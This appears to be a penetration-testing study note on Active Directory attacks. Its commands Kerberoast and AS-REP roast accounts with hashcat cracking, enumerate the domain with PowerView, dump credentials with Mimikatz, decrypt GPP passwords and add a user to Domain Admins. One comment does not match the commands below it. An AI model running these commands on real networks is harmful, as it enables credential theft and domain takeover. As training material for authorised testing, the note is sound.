# Methodology

## Enumeration

### Kali Commands

```bash
# Kerberoast
impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

# AS-REP roast
impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

### Local Commands

First, run **[BloodHound](0%20Tools/BloodHound.md)**

**PowerView**

```powershell
# Import PowerView
. .\PowerView.ps1

# Idenfity DC (check Pdc)
Get-NetDomain

# Enumerate user objects
Get-NetUser | select samaccountname, name, displayname, userprincipalname, distinguishedname, objectsid, objectguid, memberof, lastlogon, pwdlastset, badpwdcount, badpasswordtime, useraccountcontrol
Get-NetUser $USER

# Enumerate group objects
Get-NetGroup | select cn, member
Get-NetGroup $GROUP | select cn, member
Get-NetGroup -UserName $USER | select cn

# Enumerate Computer objects
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

# Find hosts on the local domain where the current user has local administrator access
Find-LocalAdminAccess

# Check for logged-in users
Get-NetSession -ComputerName $COMPUTER

# Enumerate SPNs linked to users
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Retrieve the ACL for the specified object
Get-ObjectAcl -Identity $OBJECT | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName $SID
"$SID","$SID" | Convert-SidToName

# Check if any users have "GenericAll" over a specified object
Get-ObjectAcl -Identity $OBJECT | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Enumerate domain shares
Find-DomainShare
Find-DomainShare -CheckShareAccess # Takes a long time
ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
```

**Manual**

```powershell
# Print users within the current domain
net user /domain

# Check domain user information
net user offsec /domain

# Check domain groups
net group /domain
net group "$GROUP" /domain

# Add and remove "setphanie" from "Management Department"
net group "Domain Admins" mojo /add /domain
net group "Enterprise Admins" mojo /add /domain
```

### Tools

**[Mimikatz](0%20Tools/Local/Mimikatz.md)**

```bash
# Grab credentials with mimikatz
.\mimikatz.exe
privilege::debug
token::elevate
log
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
token::revert
exit
```

**[gpp-decrypt](0%20Tools/gpp-decrypt.md)**

Decrypts GPP credentials. Typically found in files like `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml`.

Key things to look for:

- **File Location:** GPP files are usually found in the `SYSVOL` folder on a domain controller, under the path `\\[DOMAIN]\SYSVOL\[DOMAIN]\Policies\`.
- **cpassword Attribute:** Within these XML files, look for the `cpassword` attribute. This attribute holds the encrypted form of the password.
- **XML Structure:** The structure of the XML file can give you a hint. For example, in a `Groups.xml` file, you might see something like:

```xml
<Group ...>
  <Properties ... cpassword="EDUYJgCbgCAmO5E..." ... />
</Group>
```

Decrypt with:

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

**[Rubeus](0%20Tools/Local/Rubeus.md)**

Crack associated hashes in hashcat

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
